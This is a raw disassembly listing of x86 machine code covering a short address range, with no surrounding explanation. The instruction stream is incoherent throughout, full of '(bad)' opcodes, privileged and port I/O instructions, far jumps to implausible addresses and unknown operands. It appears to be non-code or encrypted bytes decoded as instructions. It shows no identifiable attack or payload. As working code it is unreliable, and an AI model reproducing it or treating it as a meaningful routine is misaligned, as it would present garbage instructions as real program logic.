  40b82d:	push   DWORD PTR [eax+esi*1+0x50]
  40b831:	add    bh,BYTE PTR [eax+0x4eb3743]
  40b837:	xchg   ebp,eax
  40b838:	leave  
  40b839:	mov    edi,0xcc0e80cf
  40b83e:	neg    BYTE PTR [ebp+0x21ee644c]
  40b844:	call   DWORD PTR [esi-0x2cdb7661]
  40b84a:	or     DWORD PTR es:[esi],ebx
  40b84d:	stc    
  40b84e:	test   al,0xf1
  40b850:	inc    edi
  40b851:	fcomp  QWORD PTR [ebx-0x1d]
  40b854:	leave  
  40b855:	jae    0x40b8ce
  40b857:	inc    esp
  40b858:	icebp  
  40b859:	xchg   BYTE PTR [edi],dh
  40b85b:	mov    bh,0x31
  40b85d:	(bad)  
  40b85e:	jecxz  0x40b810
  40b860:	fwait
  40b861:	jb     0x40b880
  40b863:	lods   eax,DWORD PTR ds:[esi]
  40b864:	idiv   DWORD PTR [edx+0x35]
  40b867:	pop    ebx
  40b868:	lea    ecx,[edx+0x77]
  40b86b:	mov    BYTE PTR [edx-0x26],ah
  40b86e:	fadd   DWORD PTR [edi]
  40b870:	pusha  
  40b871:	xor    eax,0xc4114828
  40b876:	retf   
  40b877:	push   es
  40b878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b879:	hlt    
  40b87a:	sbb    DWORD PTR [edx],esp
  40b87c:	mov    cs,esp
  40b87e:	imul   ebp,DWORD PTR [edi],0x2b15cdc8
  40b884:	outs   dx,BYTE PTR ds:[esi]
  40b885:	mov    bl,0xa3
  40b887:	xlat   BYTE PTR ds:[ebx]
  40b888:	and    ch,al
  40b88a:	jp     0x40b845
  40b88c:	mov    edi,0x4188ebd5
  40b891:	and    dl,BYTE PTR [esi+0x38]
  40b894:	push   0x5d211642
  40b899:	and    al,0xba
  40b89b:	push   0x1a
  40b89d:	push   ds
  40b89e:	pop    ebx
  40b89f:	jg     0x40b8ab
  40b8a1:	int    0xbf
  40b8a3:	sub    BYTE PTR [edx],ah
  40b8a5:	scas   al,BYTE PTR es:[edi]
  40b8a6:	sub    eax,0x635db82c
  40b8ab:	daa    
  40b8ac:	es mov bl,0x91
  40b8af:	sbb    BYTE PTR [edi+0x20],cl
  40b8b2:	jl     0x40b874
  40b8b4:	ins    BYTE PTR es:[edi],dx
  40b8b5:	nop
  40b8b6:	push   esi
  40b8b7:	xor    esp,DWORD PTR [ebp-0x5a1326f7]
  40b8bd:	jmp    0x40b8cb
  40b8bf:	movd   mm5,DWORD PTR [ebx-0xc71a3f8]
  40b8c6:	jnp    0x40b84c
  40b8c8:	add    eax,edi
  40b8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8cb:	cdq    
  40b8cc:	lock fisttp DWORD PTR [eax]
  40b8cf:	pop    es
  40b8d0:	test   BYTE PTR [ecx-0x34],dh
  40b8d3:	push   esi
  40b8d4:	dec    eax
  40b8d5:	add    edx,DWORD PTR [ecx+0x7071f52a]
  40b8db:	push   esp
  40b8dc:	and    al,0xaa
  40b8de:	js     0x40b8ba
  40b8e0:	inc    esp
  40b8e1:	pop    esi
  40b8e2:	jns    0x40b869
  40b8e4:	inc    esp
  40b8e5:	lea    esp,[eax]
  40b8e7:	jg     0x40b873
  40b8e9:	jae    0x40b8c0
  40b8eb:	fs sbb eax,0xfb31ca97
  40b8f2:	sbb    DWORD PTR [ebp-0x789e063f],0x1e
  40b8f9:	and    al,0xd4
  40b8fb:	test   BYTE PTR [ebx+0x547a2b14],ah
  40b901:	push   ebp
  40b902:	das    
  40b903:	je     0x40b928
  40b905:	sub    ecx,DWORD PTR [eax-0x2be5e802]
  40b90b:	rol    DWORD PTR [eax+0x217fc7d2],1
  40b911:	push   0x6a
  40b913:	arpl   WORD PTR [ebp-0x38],ax
  40b916:	pop    edx
  40b917:	jno    0x40b8ce
  40b919:	in     eax,0xd3
  40b91b:	sbb    eax,0xa1344805
  40b920:	leave  
  40b921:	hlt    
  40b922:	test   BYTE PTR [edi+0x211dadcf],al
  40b928:	je     0x40b8ae
  40b92a:	push   cs
  40b92b:	(bad)  
  40b92c:	adc    edi,DWORD PTR [ebx+eax*4]
  40b92f:	test   eax,0x4d00da45
  40b934:	repnz int3 
  40b936:	xchg   DWORD PTR [edx-0x483f7cc4],esi
  40b93c:	and    BYTE PTR ds:0x101e0d59,ah
  40b942:	aaa    
  40b943:	mov    BYTE PTR cs:[ecx+0x2e5ab241],ah
  40b94a:	sub    BYTE PTR [edx],0x4f
  40b94d:	fstp   QWORD PTR [edi]
  40b94f:	mov    ebp,?
  40b951:	jl     0x40b988
  40b953:	test   esi,ebp
  40b955:	push   es
  40b956:	sbb    BYTE PTR [edi-0x3c],0x1
  40b95a:	sbb    al,0x9c
  40b95c:	xor    DWORD PTR ds:0x48f3b949,0x69d73a2
  40b966:	sbb    al,dl
  40b968:	fwait
  40b969:	(bad)  
  40b96a:	fimul  DWORD PTR [eax-0x438d424e]
  40b970:	mov    WORD PTR [edi+0x5e],?
  40b973:	test   eax,0x59499d94
  40b978:	xchg   DWORD PTR [eax],edx
  40b97a:	or     DWORD PTR [ebp-0x74c8e9c6],edx
  40b980:	or     al,0x4b
  40b982:	outs   dx,BYTE PTR ds:[esi]
  40b983:	retf   
  40b984:	pop    eax
  40b985:	mov    al,ds:0x9edf3539
  40b98a:	cmc    
  40b98b:	and    ah,BYTE PTR [ecx+0x300e5da]
  40b991:	ins    DWORD PTR es:[edi],dx
  40b992:	or     al,0xb5
  40b994:	icebp  
  40b995:	mov    edx,DWORD PTR [edx+esi*4+0x7af36b28]
  40b99c:	dec    ecx
  40b99d:	add    al,0x32
  40b99f:	loopne 0x40b953
  40b9a1:	jecxz  0x40b9b2
  40b9a3:	push   ss
  40b9a4:	jb     0x40b93c
  40b9a6:	ffreep st(0)
  40b9a8:	dec    ecx
  40b9a9:	js     0x40b97c
  40b9ab:	bound  eax,QWORD PTR [edx]
  40b9ad:	push   ss
  40b9ae:	dec    edi
  40b9af:	inc    ebp
  40b9b0:	add    cl,BYTE PTR [eax-0x226f7881]
  40b9b6:	xchg   edx,eax
  40b9b7:	test   al,0xe5
  40b9b9:	mov    ds:0x74e8cba4,al
  40b9be:	mov    ebp,0x5096d184
  40b9c3:	xchg   ebp,eax
  40b9c4:	bound  esi,QWORD PTR [ecx+0x16]
  40b9c7:	push   ebx
  40b9c8:	mov    WORD PTR [edi+0x584ab048],es
  40b9ce:	jno    0x40b9ff
  40b9d0:	fmulp  st(6),st
  40b9d2:	xchg   BYTE PTR [edx-0x4661398b],cl
  40b9d8:	pop    es
  40b9d9:	and    ch,al
  40b9db:	mov    bh,0x8b
  40b9dd:	lahf   
  40b9de:	outs   dx,BYTE PTR ds:[esi]
  40b9df:	xor    al,0xca
  40b9e1:	xor    ah,dh
  40b9e3:	jb     0x40b96f
  40b9e5:	imul   ebp,DWORD PTR [eax],0x5cb1f889
  40b9eb:	enter  0xf816,0x99
  40b9ef:	popf   
  40b9f0:	fcmovb st,st(5)
  40b9f2:	cmc    
  40b9f3:	fdivr  DWORD PTR [esi-0x5d]
  40b9f6:	cmp    DWORD PTR [edx+0x5bf34de6],ebx
  40b9fc:	sub    bl,BYTE PTR [esi+esi*2-0x39bc1e9d]
  40ba03:	arpl   WORD PTR [edx-0x3f06c54b],bp
  40ba09:	addr16 mov dl,0x63
  40ba0c:	data16 test BYTE PTR [edx+0x43],0x9e
  40ba11:	sbb    al,0x50
  40ba13:	out    dx,eax
  40ba14:	push   esp
  40ba15:	or     DWORD PTR [esp+edi*1],ebx
  40ba18:	push   ebx
  40ba19:	std    
  40ba1a:	mov    cl,0x41
  40ba1c:	inc    esp
  40ba1d:	repz pop ss
  40ba1f:	adc    BYTE PTR [ebp+0x72],bh
  40ba22:	xchg   edi,eax
  40ba23:	clc    
  40ba24:	xlat   BYTE PTR ds:[ebx]
  40ba25:	(bad)  
  40ba27:	ss and eax,0x456623e5
  40ba2d:	idiv   BYTE PTR [eax+0x26fb1de5]
  40ba33:	inc    esi
  40ba34:	rcr    DWORD PTR [edx-0x2c],1
  40ba37:	je     0x40ba58
  40ba39:	icebp  
  40ba3a:	mov    ds:0x39d87d19,eax
  40ba3f:	lods   eax,DWORD PTR ds:[esi]
  40ba40:	ins    DWORD PTR es:[edi],dx
  40ba41:	pop    es
  40ba42:	xor    ah,BYTE PTR [eax-0x59]
  40ba45:	and    BYTE PTR [ebx+0x8153406],dh
  40ba4b:	(bad)  
  40ba4c:	lods   al,BYTE PTR ds:[esi]
  40ba4d:	cmp    edx,esp
  40ba4f:	scas   al,BYTE PTR es:[edi]
  40ba50:	test   esp,edi
  40ba52:	cmc    
  40ba53:	dec    edi
  40ba54:	mov    esp,0x36a0d5b2
  40ba59:	mov    WORD PTR ds:0x526f1919,?
  40ba5f:	inc    esp
  40ba60:	inc    edx
  40ba61:	xchg   edx,eax
  40ba62:	je     0x40ba4c
  40ba64:	mov    eax,0xd87ed2a1
  40ba69:	push   ebp
  40ba6a:	sbb    eax,0x3e5760ee
  40ba6f:	lods   eax,DWORD PTR ds:[esi]
  40ba70:	cmp    bl,BYTE PTR [ecx+ebx*2+0xe]
  40ba74:	xor    al,0x8
  40ba76:	xchg   ebp,eax
  40ba77:	jo     0x28923e65
  40ba7d:	inc    esi
  40ba7e:	outs   dx,BYTE PTR ds:[esi]
  40ba7f:	frstpm(287 only) 
  40ba81:	add    BYTE PTR [edx+0x1a],al
  40ba84:	arpl   di,di
  40ba86:	mov    edx,0x7f5c6d29
  40ba8b:	add    esp,esp
  40ba8d:	add    ah,BYTE PTR [edi+0x2c]
  40ba90:	in     al,0x16
  40ba92:	outs   dx,BYTE PTR ds:[esi]
  40ba93:	jo     0x40ba63
  40ba95:	and    eax,edx
  40ba97:	stos   BYTE PTR es:[edi],al
  40ba98:	fidiv  DWORD PTR [ebx-0x21]
  40ba9b:	push   0x7c
  40ba9d:	xor    eax,0x16c4e70d
  40baa2:	adc    eax,0x9d198cf
  40baa7:	cmp    BYTE PTR [esi],0x8a
  40baaa:	pop    esi
  40baab:	cwde   
  40baac:	(bad)  
  40baae:	(bad)  
  40baaf:	and    al,0xff
  40bab1:	clc    
  40bab2:	inc    esi
  40bab3:	fnsetpm(287 only) 
  40bab5:	int    0xc7
  40bab7:	je     0x40ba9d
  40bab9:	(bad)  
  40baba:	add    ecx,edi
  40babc:	fs je  0x40bb3b
  40babf:	ja     0x40bb23
  40bac1:	xchg   esi,eax
  40bac2:	in     al,dx
  40bac3:	dec    eax
  40bac4:	iret   
  40bac5:	or     al,0x6a
  40bac7:	div    dl
  40bac9:	mov    WORD PTR [ebp+0x6d56e56f],gs
  40bacf:	inc    edx
  40bad0:	pop    edi
  40bad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bad2:	mov    al,ds:0x394654d
  40bad7:	lods   al,BYTE PTR ds:[esi]
  40bad8:	mov    ebp,0x5fc1fd51
  40badd:	stos   BYTE PTR es:[edi],al
  40bade:	jnp    0x40bb00
  40bae0:	popf   
  40bae1:	pop    ds
  40bae2:	add    DWORD PTR [eax-0x26353d2f],edi
  40bae8:	or     dh,BYTE PTR [ecx+0x53]
  40baeb:	push   ss
  40baec:	nop
  40baed:	test   DWORD PTR [edx*4-0x4043b52e],esp
  40baf4:	and    eax,0x425a035a
  40baf9:	push   ebx
  40bafa:	or     BYTE PTR [ecx+edi*1],dh
  40bafd:	loop   0x40baa5
  40baff:	retf   0x7404
  40bb02:	(bad)  
  40bb03:	and    al,cl
  40bb05:	scas   al,BYTE PTR es:[edi]
  40bb06:	fsincos 
  40bb08:	jl     0x40bae8
  40bb0a:	mov    ebx,0x924749ac
  40bb0f:	mov    cl,0xcc
  40bb11:	retf   0xf06
  40bb14:	loop   0x40baf1
  40bb16:	inc    esp
  40bb17:	pop    es
  40bb18:	addr16 dec ebx
  40bb1a:	xchg   DWORD PTR [ecx+0x35],esi
  40bb1d:	and    dl,BYTE PTR [edx]
  40bb1f:	call   0xc46bd7ba
  40bb24:	loopne 0x40bb6c
  40bb26:	stc    
  40bb27:	fucom  st(1)
  40bb29:	sub    esi,esi
  40bb2b:	cmp    al,BYTE PTR [edx]
  40bb2d:	inc    edi
  40bb2e:	pusha  
  40bb2f:	and    bl,ch
  40bb31:	sbb    DWORD PTR fs:[ebp-0x2e9043f7],esp
  40bb38:	xchg   edx,eax
  40bb39:	dec    esp
  40bb3a:	lds    edx,FWORD PTR [ebx]
  40bb3c:	ss hlt 
  40bb3e:	jb     0x40bb77
  40bb40:	add    BYTE PTR [edi-0xf7125a9],dl
  40bb46:	jecxz  0x40bb81
  40bb48:	test   DWORD PTR ds:0xbc8b8eae,edx
  40bb4e:	fs dec eax
  40bb50:	mov    ch,0xb4
  40bb52:	pop    edi
  40bb53:	lock sub cl,BYTE PTR [ebp+0x177d96f1]
  40bb5a:	and    BYTE PTR [ebp+0x78],ah
  40bb5d:	push   ds
  40bb5e:	test   BYTE PTR [ecx],ah
  40bb60:	cmp    WORD PTR [edi],sp
  40bb63:	cs out dx,eax
  40bb65:	mov    ch,0xfd
  40bb67:	fistp  DWORD PTR [ebx+0x72]
  40bb6a:	into   
  40bb6b:	cmp    esp,DWORD PTR [edx+0x1cc326bd]
  40bb71:	or     DWORD PTR [edx+0xe],0x59
  40bb75:	or     BYTE PTR [edx-0x23],dh
  40bb78:	inc    esi
  40bb79:	dec    esi
  40bb7a:	push   ecx
  40bb7b:	adc    cl,BYTE PTR ds:0x7f53e51f
  40bb81:	outs   dx,BYTE PTR ds:[esi]
  40bb82:	test   al,al
  40bb84:	cwde   
  40bb85:	test   al,0x28
  40bb87:	adc    BYTE PTR [eax+ecx*1-0x23df26e7],bh
  40bb8e:	es dec esi
  40bb90:	push   edi
  40bb91:	xchg   edi,eax
  40bb92:	push   ebx
  40bb93:	loope  0x40bb85
  40bb95:	inc    edx
  40bb96:	mov    ebx,0x91a417d7
  40bb9b:	pop    esi
  40bb9c:	enter  0xb76,0xda
  40bba0:	loope  0x40bb4f
  40bba2:	clc    
  40bba3:	xlat   BYTE PTR ds:[ebx]
  40bba4:	pop    es
  40bba5:	pop    edi
  40bba6:	and    ah,BYTE PTR [esp+eax*4]
  40bba9:	(bad)  
  40bbab:	mov    ?,WORD PTR [edx+0x54]
  40bbae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbaf:	dec    edx
  40bbb0:	rol    BYTE PTR [esi],0xe2
  40bbb3:	retf   0xe5d1
  40bbb6:	rol    DWORD PTR [ebx+0x3b055fe2],1
  40bbbc:	sub    al,0xed
  40bbbe:	mov    DWORD PTR [esi],0xf3594c33
  40bbc4:	bound  esp,QWORD PTR ss:[edx+0x36dbeca]
  40bbcb:	and    esi,DWORD PTR [eax+0x72adc424]
  40bbd1:	dec    edx
  40bbd2:	mov    dl,0x8b
  40bbd4:	or     eax,0x7f950d69
  40bbd9:	lods   eax,DWORD PTR ds:[esi]
  40bbda:	retf   0x12dd
  40bbdd:	pop    ecx
  40bbde:	jnp    0x40bc00
  40bbe0:	outs   dx,DWORD PTR ds:[esi]
  40bbe1:	aas    
  40bbe2:	jecxz  0x40bc61
  40bbe4:	and    al,0xbf
  40bbe6:	out    0xee,al
  40bbe8:	(bad)  
  40bbe9:	loopne 0x40bbb8
  40bbeb:	test   BYTE PTR [edx],bl
  40bbed:	out    dx,eax
  40bbee:	gs ret 0xe2c5
  40bbf2:	lods   eax,DWORD PTR ds:[esi]
  40bbf3:	shl    edi,1
  40bbf5:	mov    ch,0x16
  40bbf7:	lahf   
  40bbf8:	pop    ebp
  40bbf9:	add    DWORD PTR [esi+ebp*4],0xfffffff0
  40bbfd:	add    DWORD PTR [edx-0x22],edx
  40bc00:	add    edx,DWORD PTR [esi+0x8968fe7]
  40bc06:	add    ch,BYTE PTR [ebx-0xa]
  40bc09:	fldenv [edx-0x3c362fbb]
  40bc0f:	add    dh,al
  40bc11:	sbb    BYTE PTR [edx-0x1],ah
  40bc14:	stos   DWORD PTR es:[edi],eax
  40bc15:	test   edi,edi
  40bc17:	sahf   
  40bc18:	cld    
  40bc19:	mov    ds:0x88217ff1,al
  40bc1e:	stos   DWORD PTR es:[edi],eax
  40bc1f:	push   cs
  40bc20:	psubsb mm5,QWORD PTR [edi-0x2d]
  40bc24:	sbb    eax,DWORD PTR [ebx-0x6d]
  40bc27:	sub    BYTE PTR [edx-0x34db8697],ah
  40bc2d:	ds jbe 0x40bbef
  40bc30:	loop   0x40bbf5
  40bc32:	mov    al,ds:0x56d086aa
  40bc37:	icebp  
  40bc38:	pop    ebp
  40bc39:	jnp    0x40bc3a
  40bc3b:	jg     0x40bbcb
  40bc3d:	(bad)  
  40bc3e:	ja     0x40bc6e
  40bc40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc41:	push   0xffffffbc
  40bc43:	out    0x4f,eax
  40bc45:	repnz ins DWORD PTR es:[edi],dx
  40bc47:	dec    esi
  40bc48:	and    BYTE PTR [ecx+0x6ac87275],dl
  40bc4e:	push   0x3e8a1c77
  40bc53:	sbb    BYTE PTR [ebx+0x19f98c83],dl
  40bc59:	outs   dx,DWORD PTR ds:[esi]
  40bc5a:	sar    DWORD PTR [ebx+0x11],0xa5
  40bc5e:	adc    ch,BYTE PTR [edi-0x19245ed0]
  40bc64:	in     eax,0xf0
  40bc66:	lods   al,BYTE PTR ds:[esi]
  40bc67:	xor    eax,DWORD PTR [eax]
  40bc69:	scas   eax,DWORD PTR es:[edi]
  40bc6a:	outs   dx,DWORD PTR ds:[esi]
  40bc6b:	or     BYTE PTR [eax-0x2e],dh
  40bc6e:	sub    BYTE PTR [edi+0xe],bl
  40bc71:	pusha  
  40bc72:	xor    BYTE PTR [ebp-0x7e9dd05d],cl
  40bc78:	push   edx
  40bc79:	mov    eax,0xac60ab8a
  40bc7e:	xchg   edi,eax
  40bc7f:	push   ebx
  40bc80:	adc    dh,BYTE PTR [edi-0x6a]
  40bc83:	jl     0x40bcf7
  40bc85:	push   edi
  40bc86:	cmp    edi,edi
  40bc88:	pusha  
  40bc89:	lods   eax,DWORD PTR ds:[esi]
  40bc8a:	xchg   ebx,eax
  40bc8b:	push   ss
  40bc8c:	inc    ecx
  40bc8d:	push   0x61da11e0
  40bc92:	fchs   
  40bc94:	pop    esp
  40bc95:	mov    dh,0x9a
  40bc97:	mov    cl,0x6f
  40bc99:	imul   edx,DWORD PTR [eax+edx*4+0x39],0x47
  40bc9e:	(bad)  
  40bc9f:	(bad)  
  40bca1:	pop    esi
  40bca2:	pop    esp
  40bca3:	push   ebx
  40bca4:	sub    DWORD PTR [ebp+esi*8-0x59868c37],edx
  40bcab:	test   al,0xe1
  40bcad:	sub    ah,bl
  40bcaf:	xor    bh,0x36
  40bcb2:	push   esp
  40bcb3:	fs pusha 
  40bcb5:	add    al,0x94
  40bcb7:	es add dl,al
  40bcba:	and    ch,BYTE PTR ds:0xe98d8746
  40bcc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcc1:	gs ja  0x40bcf7
  40bcc4:	dec    eax
  40bcc5:	push   edx
  40bcc6:	pop    esp
  40bcc7:	sbb    BYTE PTR [edi+0x8],bl
  40bcca:	in     eax,0xfe
  40bccc:	icebp  
  40bccd:	sbb    ecx,edx
  40bccf:	in     al,dx
  40bcd0:	pop    ss
  40bcd1:	push   ss
  40bcd2:	clc    
  40bcd3:	dec    ebp
  40bcd4:	sbb    ah,BYTE PTR [edx]
  40bcd6:	int3   
  40bcd7:	pop    ebp
  40bcd8:	rcl    DWORD PTR [ecx+0x4950a38d],0x7e
  40bcdf:	sti    
  40bce0:	push   es
  40bce1:	and    eax,0xf5aa9506
  40bce6:	sub    edi,DWORD PTR [esi]
  40bce8:	cdq    
  40bce9:	sub    eax,DWORD PTR [edx]
  40bceb:	das    
  40bcec:	pop    es
  40bced:	add    eax,0x8d26f3d8
  40bcf2:	jbe    0x40bd4d
  40bcf4:	mov    ebp,0xa6b9b517
  40bcf9:	add    DWORD PTR [edi-0xbf8eb0b],ecx
  40bcff:	repnz in eax,0x92
  40bd02:	adc    BYTE PTR [ebx],0x3d
  40bd05:	jmp    0x9a8b6300
  40bd0a:	gs ja  0x40bd14
  40bd0d:	dec    ebp
  40bd0e:	push   0x91b6a05c
  40bd13:	mov    gs,WORD PTR [edx-0x5]
  40bd16:	and    eax,0x90e7953
  40bd1b:	inc    ecx
  40bd1c:	test   al,0x9e
  40bd1e:	mov    BYTE PTR [edx],dh
  40bd20:	cwde   
  40bd21:	or     DWORD PTR [ebp+esi*2-0x3d1cdbd1],0xa232b2e
  40bd2c:	xchg   edx,eax
  40bd2d:	push   ss
  40bd2e:	retf   
  40bd2f:	(bad)  
  40bd31:	mov    eax,0xa6815cf
  40bd36:	shl    BYTE PTR [edi+0x4c],0xe7
  40bd3a:	aas    
  40bd3b:	push   ss
  40bd3c:	inc    edi
  40bd3d:	fsubr  DWORD PTR [ebx]
  40bd3f:	cmp    DWORD PTR [edi-0x6da803b3],ecx
  40bd45:	sbb    eax,0xebc35d9
  40bd4a:	mov    bh,0x36
  40bd4c:	mov    ch,0x4e
  40bd4e:	jnp    0x40bdaa
  40bd50:	stos   BYTE PTR es:[edi],al
  40bd51:	outs   dx,BYTE PTR ds:[esi]
  40bd52:	data16 lods al,BYTE PTR ds:[esi]
  40bd54:	outs   dx,DWORD PTR ds:[esi]
  40bd55:	cmp    BYTE PTR [ebx+0x4f],0xb2
  40bd59:	push   esp
  40bd5a:	xor    eax,0x11af3230
  40bd5f:	aam    0x5f
  40bd61:	mov    ds,WORD PTR [ecx-0x7406037e]
  40bd67:	pop    edi
  40bd68:	out    0x3d,al
  40bd6a:	cld    
  40bd6b:	sub    eax,0x8d7ff11c
  40bd70:	inc    ebx
  40bd71:	mov    ss,WORD PTR [edx]
  40bd73:	mov    BYTE PTR [eax],bl
  40bd75:	mov    ah,BYTE PTR [ebx+0x920def0]
  40bd7b:	push   eax
  40bd7c:	lods   al,BYTE PTR ds:[esi]
  40bd7d:	aam    0x5
  40bd7f:	ficom  WORD PTR [ecx+0x69]
  40bd82:	xor    edx,esp
  40bd84:	repnz (bad) [eax-0x5d]
  40bd88:	int3   
  40bd89:	das    
  40bd8a:	mov    esp,0x405576f8
  40bd8f:	bound  ecx,QWORD PTR [ebx+eax*4-0x74]
  40bd93:	(bad)  
  40bd95:	and    eax,DWORD PTR [ebx-0x8]
  40bd98:	xchg   edi,eax
  40bd99:	das    
  40bd9a:	sub    eax,DWORD PTR [edi+edx*4]
  40bd9d:	(bad)
  40bda1:	or     eax,0x91509789
  40bda6:	es mov esp,0xa7581ed4
  40bdac:	mov    bl,0x5a
  40bdae:	or     BYTE PTR [ebp+0x75],0x17
  40bdb2:	or     BYTE PTR ds:0x4ae47558,ah
  40bdb8:	push   eax
  40bdb9:	pushf  
  40bdba:	or     al,0xa8
  40bdbc:	adc    bl,BYTE PTR [eax-0x23]
  40bdbf:	mov    edx,0x47dfdcbf
  40bdc4:	mov    ah,0x28
  40bdc6:	data16 mov dl,0xd2
  40bdc9:	idiv   BYTE PTR [edi-0x650e1a42]
  40bdcf:	sbb    al,0xee
  40bdd1:	cld    
  40bdd2:	mov    ah,0x14
  40bdd4:	mov    cl,dh
  40bdd6:	mov    eax,0xed3b931c
  40bddb:	cwde   
  40bddc:	xchg   esp,eax
  40bddd:	jne    0x40bd9f
  40bddf:	repz add bl,0xde
  40bde3:	mov    ds:0xbdaf6ce5,al
  40bde8:	jne    0x40be3e
  40bdea:	push   ecx
  40bdeb:	pushf  
  40bdec:	jns    0x40be33
  40bdee:	jnp    0x40bde0
  40bdf0:	dec    ebp
  40bdf1:	cmp    bl,BYTE PTR [edi+esi*8+0x2f959e76]
  40bdf8:	sbb    ch,bh
  40bdfa:	jmp    DWORD PTR [edx+eax*4+0x42]
  40bdfe:	jae    0x40be62
  40be00:	ffree  st(7)
  40be02:	int3   
  40be03:	fidiv  WORD PTR [ebp+0x14dc93bb]
  40be09:	jge    0x40bdf4
  40be0b:	outs   dx,BYTE PTR ds:[esi]
  40be0c:	fidiv  DWORD PTR [eax+0x2bbff973]
  40be12:	mov    edx,0x508899f4
  40be17:	(bad)  
  40be18:	jns    0x40be0a
  40be1a:	test   al,0x6f
  40be1c:	shr    DWORD PTR [ebx-0x4a],1
  40be1f:	sbb    al,0xe4
  40be21:	arpl   WORD PTR [ecx+0x5f],ax
  40be24:	sub    dh,BYTE PTR [ebx]
  40be26:	repnz cld 
  40be28:	mov    bh,0x9c
  40be2a:	call   0x1c494ce3
  40be2f:	mov    bh,0xb7
  40be31:	inc    ebp
  40be32:	(bad)
  40be36:	xlat   BYTE PTR ds:[ebx]
  40be37:	shl    DWORD PTR [ebx+0x734542e1],1
  40be3d:	(bad)  
  40be3e:	outs   dx,DWORD PTR ds:[esi]
  40be3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be40:	jb     0x40bea6
  40be42:	or     ecx,DWORD PTR [eax+0x734b79e5]
  40be48:	out    dx,al
  40be49:	dec    edi
  40be4a:	test   DWORD PTR [ecx-0x1397213a],eax
  40be50:	fld    TBYTE PTR [edi-0x1d43e11b]
  40be56:	cdq    
  40be57:	daa    
  40be58:	inc    esp
  40be59:	and    eax,0x8cbc38f4
  40be5e:	xor    ch,BYTE PTR [ebx]
  40be60:	push   ecx
  40be61:	jecxz  0x40bed9
  40be63:	sub    DWORD PTR [ebx+0xf],0xee499207
  40be6a:	sar    DWORD PTR [ebx-0x71],cl
  40be6d:	mov    cl,0x49
  40be6f:	ins    DWORD PTR es:[edi],dx
  40be70:	in     eax,dx
  40be71:	jecxz  0x40be92
  40be73:	jmp    0x7ce429c0
  40be78:	call   0x953d:0x9880a0d7
  40be7f:	cdq    
  40be80:	lock std 
  40be82:	ret    0xc744
  40be85:	dec    ebp
  40be86:	enter  0xb176,0x3e
  40be8a:	(bad)  
  40be8b:	sti    
  40be8c:	outs   dx,DWORD PTR ds:[esi]
  40be8d:	cld    
  40be8e:	or     BYTE PTR [edi+0x7532212e],cl
  40be94:	imul   esi,DWORD PTR [edx+esi*8+0x3d],0xffffffe0
  40be99:	pushf  
  40be9a:	shl    BYTE PTR [esi],1
  40be9c:	mov    bh,0x5a
  40be9e:	ja     0x40bece
  40bea0:	js     0x40bee6
  40bea2:	cs dec esp
  40bea4:	jmp    0x40bebb
  40bea6:	cmp    eax,0xa291522e
  40beab:	pop    ebp
  40beac:	jne    0x40bec1
  40beae:	out    0x5,eax
  40beb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beb1:	test   BYTE PTR [edx+0x44],ah
  40beb4:	ins    DWORD PTR es:[edi],dx
  40beb5:	out    dx,eax
  40beb6:	jmp    0x97ba:0x10742f6e
  40bebd:	jnp    0x40bed3
  40bebf:	adc    BYTE PTR [ecx],bl
  40bec1:	cwde   
  40bec2:	(bad)  
  40bec3:	call   FWORD PTR [eax+0x24]
  40bec6:	pushf  
  40bec7:	fdiv   DWORD PTR [ecx-0x5b]
  40beca:	jo     0x40bf43
  40becc:	cmp    al,0xd2
  40bece:	pop    ss
  40becf:	dec    esp
  40bed0:	sbb    al,0x7
  40bed2:	daa    
  40bed3:	cs es jnp 0x40be91
  40bed7:	mov    ecx,DWORD PTR [esp+eax*4-0x1b8bc3cb]
  40bede:	jmp    0xc9f1622d
  40bee3:	out    0xef,eax
  40bee5:	push   0x51fe5285
  40beea:	push   0x5a04a5b2
  40beef:	fcomp  DWORD PTR [edi-0x3b]
  40bef2:	out    0xf0,al
  40bef4:	mov    esi,0x9d0207c1
  40bef9:	dec    eax
  40befa:	in     eax,dx
  40befb:	lock adc al,ah
  40befe:	mov    cs,ebp
  40bf00:	xor    BYTE PTR [ebx],ch
  40bf02:	jae    0x40bf55
  40bf04:	add    BYTE PTR [ecx],0xc5
  40bf07:	fwait
  40bf08:	fs pop esi
  40bf0a:	inc    esi
  40bf0b:	arpl   WORD PTR [eax-0x37],si
  40bf0e:	lock xchg BYTE PTR [edi+0x9],ch
  40bf12:	cs test esp,esp
  40bf15:	clc    
  40bf16:	dec    ebp
  40bf17:	stos   BYTE PTR es:[edi],al
  40bf18:	addr16 push 0xfffffff4
  40bf1b:	xor    ch,BYTE PTR [ebx+0x65]
  40bf1e:	push   esp
  40bf1f:	add    eax,0xe013f87f
  40bf24:	or     ch,BYTE PTR [ecx-0x35]
  40bf27:	call   FWORD PTR [edi]
  40bf29:	inc    esi
  40bf2a:	jmp    0x9ac9:0xe9eec4a4
  40bf31:	leave  
  40bf32:	stos   BYTE PTR es:[edi],al
  40bf33:	sub    bh,BYTE PTR [ebp-0x4e]
  40bf36:	add    ch,BYTE PTR [esi]
  40bf38:	pop    ds
  40bf39:	mov    bh,0x24
  40bf3b:	xor    eax,DWORD PTR [ebx-0x53]
  40bf3e:	clc    
  40bf3f:	lea    ebp,[eax-0x65]
  40bf42:	(bad)  
  40bf43:	sti    
  40bf44:	dec    esp
  40bf45:	xchg   ecx,eax
  40bf46:	int3   
  40bf47:	es mov eax,cs
  40bf4a:	sub    ebp,DWORD PTR [ebp-0x4c019152]
  40bf50:	cwde   
  40bf51:	dec    ebp
  40bf52:	or     bl,BYTE PTR [esi-0x46527f3c]
  40bf58:	pop    esp
  40bf59:	add    dl,BYTE PTR [edx]
  40bf5b:	cmp    bh,BYTE PTR [ecx+0x64240753]
  40bf61:	ja     0x40bf0e
  40bf63:	pop    ss
  40bf64:	pop    edi
  40bf65:	mov    al,ds:0x95d4d9a4
  40bf6a:	data16 loop 0x40bf55
  40bf6d:	xor    al,0x22
  40bf6f:	mov    dh,0x26
  40bf71:	mov    edi,edi
  40bf73:	mov    bh,BYTE PTR [edx+0xf8f8abe]
  40bf79:	aaa    
